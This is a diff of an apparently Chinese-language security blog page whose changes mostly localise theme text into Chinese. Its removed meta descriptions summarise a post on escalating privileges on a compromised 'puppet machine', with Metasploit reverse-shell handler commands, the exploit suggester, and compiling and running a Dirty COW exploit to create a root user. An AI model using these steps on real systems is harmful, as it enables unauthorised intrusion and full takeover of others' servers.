@@ -1,26 +1,11 @@
 <!DOCTYPE html>
-<html lang="">
+<html lang="zh-CN">
     <head>
         <meta charset="utf-8">
         <meta name="viewport" content="width=device-width, initial-scale=1">
         <meta name="robots" content="noodp" />
         <title>对某傀儡机的提权操作 - AFTERMORR0W</title><meta name="Description" content="Get01d &#39;s blog"><meta property="og:title" content="对某傀儡机的提权操作" />
-<meta property="og:description" content="前言 链接：https://aftermorr0w.github.io/posts/pdf%E5%86%99%E5%85%A5javascript%E9%80%A0%E6%88%90xss/
-我们废了半天劲拿下了他的服务器，现在回过头来对其linux服务器进行提权
-还是使用我们万能的msf 这里介绍的是suggester模块，该模块可以教我们如何快速的查找目标可用的提权EXP
-设置session 我们先连上我们的msf 设置一个session vps操作
-use exploit/multi/handlerset payload php/meterpreter/reverse_tcpshow optionsset lhost 0.0.0.0run 我们会获取一个会话session
-suggester查找有用EXP backgroundsearch suggesteruse 0optionsset session 1run 真TM牛逼，还以为是个好的文章素材呢，这就翻车了
-赃牛提权CVE-2016-5195 Linux kernel &gt;= 2.6.22（2007年发行，到2016年10月18日才修复）
-uname -a 查看linus内核 刚好满足赃牛提权的条件
-那就试一试
-利用exp2 应该是这个服务器的gcc版本问题，exp1失败了
-链接：https://github.com/FireFart/dirtycow
-upload filename_path path 将exp传到傀儡机
-到达exp的目录 然后运行make编译 make如果不成功 运行下面的指令也一样
-gcc -pthread dirty.c -o dirty –lcrypt 然后再运行./dirty 会让你输入new password 这个就是给你创建一个新的超级管理员用户
-添加的时候会需要等一会
-然后su - firefart 切换用户 报错： standard in must be a tty" />
+<meta property="og:description" content="前言 链接：https://aftermorr0w.github.io/posts/pdf%E5%86%99%E5%85%A5javascri" />
 <meta property="og:type" content="article" />
 <meta property="og:url" content="https://aftermorr0w.github.io/posts/%E5%AF%B9%E6%9F%90%E5%82%80%E5%84%A1%E6%9C%BA%E7%9A%84%E6%8F%90%E6%9D%83%E6%93%8D%E4%BD%9C/" /><meta property="article:section" content="posts" />
 <meta property="article:published_time" content="2022-09-13T19:52:48+08:00" />
@@ -28,22 +13,7 @@ gcc -pthread dirty.c -o dirty –lcrypt 然后再运行./dirty 会让你输入ne
 
 <meta name="twitter:card" content="summary"/>
 <meta name="twitter:title" content="对某傀儡机的提权操作"/>
-<meta name="twitter:description" content="前言 链接：https://aftermorr0w.github.io/posts/pdf%E5%86%99%E5%85%A5javascript%E9%80%A0%E6%88%90xss/
-我们废了半天劲拿下了他的服务器，现在回过头来对其linux服务器进行提权
-还是使用我们万能的msf 这里介绍的是suggester模块，该模块可以教我们如何快速的查找目标可用的提权EXP
-设置session 我们先连上我们的msf 设置一个session vps操作
-use exploit/multi/handlerset payload php/meterpreter/reverse_tcpshow optionsset lhost 0.0.0.0run 我们会获取一个会话session
-suggester查找有用EXP backgroundsearch suggesteruse 0optionsset session 1run 真TM牛逼，还以为是个好的文章素材呢，这就翻车了
-赃牛提权CVE-2016-5195 Linux kernel &gt;= 2.6.22（2007年发行，到2016年10月18日才修复）
-uname -a 查看linus内核 刚好满足赃牛提权的条件
-那就试一试
-利用exp2 应该是这个服务器的gcc版本问题，exp1失败了
-链接：https://github.com/FireFart/dirtycow
-upload filename_path path 将exp传到傀儡机
-到达exp的目录 然后运行make编译 make如果不成功 运行下面的指令也一样
-gcc -pthread dirty.c -o dirty –lcrypt 然后再运行./dirty 会让你输入new password 这个就是给你创建一个新的超级管理员用户
-添加的时候会需要等一会
-然后su - firefart 切换用户 报错： standard in must be a tty"/>
+<meta name="twitter:description" content="前言 链接：https://aftermorr0w.github.io/posts/pdf%E5%86%99%E5%85%A5javascri"/>
 <meta name="application-name" content="AfterMorr0w">
 <meta name="apple-mobile-web-app-title" content="AfterMorr0w"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
         <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
@@ -54,16 +24,16 @@ gcc -pthread dirty.c -o dirty –lcrypt 然后再运行./dirty 会让你输入ne
         "@context": "http://schema.org",
         "@type": "BlogPosting",
         "headline": "对某傀儡机的提权操作",
-        "inLanguage": "",
+        "inLanguage": "zh-CN",
         "mainEntityOfPage": {
             "@type": "WebPage",
             "@id": "https:\/\/aftermorr0w.github.io\/posts\/%E5%AF%B9%E6%9F%90%E5%82%80%E5%84%A1%E6%9C%BA%E7%9A%84%E6%8F%90%E6%9D%83%E6%93%8D%E4%BD%9C\/"
-        },"genre": "posts","keywords": "渗透","wordcount":  101 ,
+        },"genre": "posts","keywords": "渗透","wordcount":  656 ,
         "url": "https:\/\/aftermorr0w.github.io\/posts\/%E5%AF%B9%E6%9F%90%E5%82%80%E5%84%A1%E6%9C%BA%E7%9A%84%E6%8F%90%E6%9D%83%E6%93%8D%E4%BD%9C\/","datePublished": "2022-09-13T19:52:48+08:00","dateModified": "2022-09-13T19:52:48+08:00","publisher": {
             "@type": "Organization",
             "name": ""},"author": {
                 "@type": "Person",
-                "name": "Author"
+                "name": "AfterMorr0w"
             },"description": ""
     }
     </script></head>
@@ -75,7 +45,7 @@ gcc -pthread dirty.c -o dirty –lcrypt 然后再运行./dirty 会让你输入ne
             <a href="/" title="AFTERMORR0W">AfterMorr0w</a>
         </div>
         <div class="menu">
-            <div class="menu-inner"><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> 文章 </a><a class="menu-item" href="/tags/"> 文章标签 </a><span class="menu-item delimiter"></span><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
                     <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
                 </a></div>
         </div>
@@ -90,21 +60,21 @@ gcc -pthread dirty.c -o dirty –lcrypt 然后再运行./dirty 会让你输入ne
                 <span></span><span></span><span></span>
             </div>
         </div>
-        <div class="menu" id="menu-mobile"><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+        <div class="menu" id="menu-mobile"><a class="menu-item" href="/posts/" title="">文章</a><a class="menu-item" href="/tags/" title="">文章标签</a><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
                 <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
             </a></div>
     </div>
 </header><main class="main">
                 <div class="container"><div class="toc" id="toc-auto">
-            <h2 class="toc-title">Contents</h2>
+            <h2 class="toc-title">目录</h2>
             <div class="toc-content" id="toc-content-auto"></div>
         </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">对某傀儡机的提权操作</h1><div class="post-meta">
-            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel="author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Author</a></span></div>
-            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2022-09-13">2022-09-13</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;101 words&nbsp;
-                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;One minute&nbsp;</div>
+            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel="author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>AfterMorr0w</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2022-09-13">2022-09-13</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;约 656 字&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;预计阅读 2 分钟&nbsp;</div>
         </div><div class="details toc" id="toc-static"  data-kept="">
                 <div class="details-summary toc-title">
-                    <span>Contents</span>
+                    <span>目录</span>
                     <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
                 </div>
                 <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents"></nav></div>
@@ -249,12 +219,12 @@ python -c &#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39;
     <div class="post-info">
         <div class="post-info-line">
             <div class="post-info-mod">
-                <span>Updated on 2022-09-13</span>
+                <span>更新于 2022-09-13</span>
             </div></div>
         <div class="post-info-line">
             <div class="post-info-md"></div>
             <div class="post-info-share">
-                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="https://aftermorr0w.github.io/posts/%E5%AF%B9%E6%9F%90%E5%82%80%E5%84%A1%E6%9C%BA%E7%9A%84%E6%8F%90%E6%9D%83%E6%93%8D%E4%BD%9C/" data-title="对某傀儡机的提权操作" data-hashtags="渗透"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="https://aftermorr0w.github.io/posts/%E5%AF%B9%E6%9F%90%E5%82%80%E5%84%A1%E6%9C%BA%E7%9A%84%E6%8F%90%E6%9D%83%E6%93%8D%E4%BD%9C/" data-hashtag="渗透"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Hacker News" data-sharer="hackernews" data-url="https://aftermorr0w.github.io/posts/%E5%AF%B9%E6%9F%90%E5%82%80%E5%84%A1%E6%9C%BA%E7%9A%84%E6%8F%90%E6%9D%83%E6%93%8D%E4%BD%9C/" data-title="对某傀儡机的提权操作"><i class="fab fa-hacker-news fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Line" data-sharer="line" data-url="https://aftermorr0w.github.io/posts/%E5%AF%B9%E6%9F%90%E5%82%80%E5%84%A1%E6%9C%BA%E7%9A%84%E6%8F%90%E6%9D%83%E6%93%8D%E4%BD%9C/" data-title="对某傀儡机的提权操作"><i data-svg-src="https://cdn.jsdelivr.net/npm/simple-icons@7.3.0/icons/line.svg" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="https://aftermorr0w.github.io/posts/%E5%AF%B9%E6%9F%90%E5%82%80%E5%84%A1%E6%9C%BA%E7%9A%84%E6%8F%90%E6%9D%83%E6%93%8D%E4%BD%9C/" data-title="对某傀儡机的提权操作" data-ralateuid="https://weibo.com/7770279120"><i class="fab fa-weibo fa-fw" aria-hidden="true"></i></a></span>
+                <span><a href="javascript:void(0);" title="分享到 Twitter" data-sharer="twitter" data-url="https://aftermorr0w.github.io/posts/%E5%AF%B9%E6%9F%90%E5%82%80%E5%84%A1%E6%9C%BA%E7%9A%84%E6%8F%90%E6%9D%83%E6%93%8D%E4%BD%9C/" data-title="对某傀儡机的提权操作" data-hashtags="渗透"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="分享到 Facebook" data-sharer="facebook" data-url="https://aftermorr0w.github.io/posts/%E5%AF%B9%E6%9F%90%E5%82%80%E5%84%A1%E6%9C%BA%E7%9A%84%E6%8F%90%E6%9D%83%E6%93%8D%E4%BD%9C/" data-hashtag="渗透"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="分享到 Hacker News" data-sharer="hackernews" data-url="https://aftermorr0w.github.io/posts/%E5%AF%B9%E6%9F%90%E5%82%80%E5%84%A1%E6%9C%BA%E7%9A%84%E6%8F%90%E6%9D%83%E6%93%8D%E4%BD%9C/" data-title="对某傀儡机的提权操作"><i class="fab fa-hacker-news fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="分享到 Line" data-sharer="line" data-url="https://aftermorr0w.github.io/posts/%E5%AF%B9%E6%9F%90%E5%82%80%E5%84%A1%E6%9C%BA%E7%9A%84%E6%8F%90%E6%9D%83%E6%93%8D%E4%BD%9C/" data-title="对某傀儡机的提权操作"><i data-svg-src="https://cdn.jsdelivr.net/npm/simple-icons@7.3.0/icons/line.svg" aria-hidden="true"></i></a><a href="javascript:void(0);" title="分享到 微博" data-sharer="weibo" data-url="https://aftermorr0w.github.io/posts/%E5%AF%B9%E6%9F%90%E5%82%80%E5%84%A1%E6%9C%BA%E7%9A%84%E6%8F%90%E6%9D%83%E6%93%8D%E4%BD%9C/" data-title="对某傀儡机的提权操作" data-ralateuid="https://weibo.com/7770279120"><i class="fab fa-weibo fa-fw" aria-hidden="true"></i></a></span>
             </div>
         </div>
     </div>
@@ -262,7 +232,7 @@ python -c &#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39;
     <div class="post-info-more">
         <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/%E6%B8%97%E9%80%8F/">渗透</a></section>
         <section>
-            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
         </section>
     </div>
 
@@ -272,14 +242,14 @@ python -c &#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39;
                 Please enable JavaScript to view the comments powered by <a href="https://giscus.app">Giscus</a>.
             </noscript></div></article></div>
             </main><footer class="footer">
-        <div class="footer-container"><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank"></a></span></div>
+        <div class="footer-container"><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">AfterMorr0w</a></span></div>
         </div>
     </footer></div>
 
-        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="回到顶部">
                 <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
-            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+            </a><a href="#" id="view-comments" class="fixed-button" title="查看评论">
                 <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
             </a>
-        </div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lazysizes@5.3.2/lazysizes.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/clipboard@2.0.11/dist/clipboard.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/sharer.js@0.5.1/sharer.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":30},"comment":{"giscus":{"category":"Announcements","categoryId":"DIC_kwDOH_lq2M4CRa6-","darkTheme":"dark","emitMetadata":"0","inputPosition":"bottom","lang":"zh-CN","lazyLoading":false,"lightTheme":"light","mapping":"pathname","reactionsEnabled":"1","repo":"AfterMorr0w/giscus","repoId":"R_kgDOH_lq2A"}}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+        </div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lazysizes@5.3.2/lazysizes.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/clipboard@2.0.11/dist/clipboard.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/sharer.js@0.5.1/sharer.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"复制到剪贴板","maxShownLines":30},"comment":{"giscus":{"category":"Announcements","categoryId":"DIC_kwDOH_lq2M4CRa6-","darkTheme":"dark","emitMetadata":"0","inputPosition":"bottom","lang":"zh-CN","lazyLoading":false,"lightTheme":"light","mapping":"pathname","reactionsEnabled":"1","repo":"AfterMorr0w/giscus","repoId":"R_kgDOH_lq2A"}}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
 </html>
